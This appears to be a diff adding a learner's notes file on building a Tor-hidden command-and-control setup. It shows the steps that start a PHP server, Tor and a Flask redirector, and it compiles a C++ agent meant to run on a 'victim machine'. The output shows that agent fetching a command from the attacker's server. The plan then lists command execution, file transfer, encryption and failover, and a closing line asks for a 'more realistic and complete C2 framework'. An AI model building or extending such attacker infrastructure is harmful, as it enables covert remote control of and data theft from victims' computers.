@@ -1,0 +1,52 @@
+HIDDEN C2 VIA REDIRACTOR---> SIMPLE C++ AGENT
+- Goal is to retrieve a command from a Tor-based C2 server through a redirector
+No Advanced features:
+1. Persistence
+2. Encryption
+- No complexity just how the pieces connect.
+
+SITUATION
+- Elements we have:
+a. Command and control server runing in Deep web(.onion)
+b. HTTP/S Server Redirector from the .onion
+- Whats missing here?
+a. Agent that will be executed in the victim machine.
+Agent<-->Redirector<-->Tor(.onion)<--->Attacker;)
+
+
+STEP 1: Start our PHP server
+	kali> php -S 127.0.0.1:8000
+
+STEP 2: Start our tor:
+	kali> sudo systemctl start tor
+
+STEP3: Start our redirector flask server.
+	kali> python redirector.py
+
+STEP4: Write our windows exe
+SAVED:agent_windows.cpp
+	cmd>> g++ -o agent.exe agent_windows.cpp -lws2_
+
+STEP5: RUN
+-------------------------------------------------------
+(venv) J:\Learning c++\Command_and_control>agent.exe
+HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.13.3
+Date: Fri, 31 Oct 2025 15:16:18 GMT
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 4
+Connection: close
+
+dir
+-------------------------------------------------------
+
+- The dir command is successfully  retrieved with the C++ agent.
+
+NEXT STEPS
+1. Restrict access to the redirector endpoint
+2. Encrypt the communication
+3. Failover logic in client(retry other redirectors if the main fail)
+4. Command execution
+5. File Upload/Download
+
+NOTE: Transform the above to a more realistic and complete C2 framework.
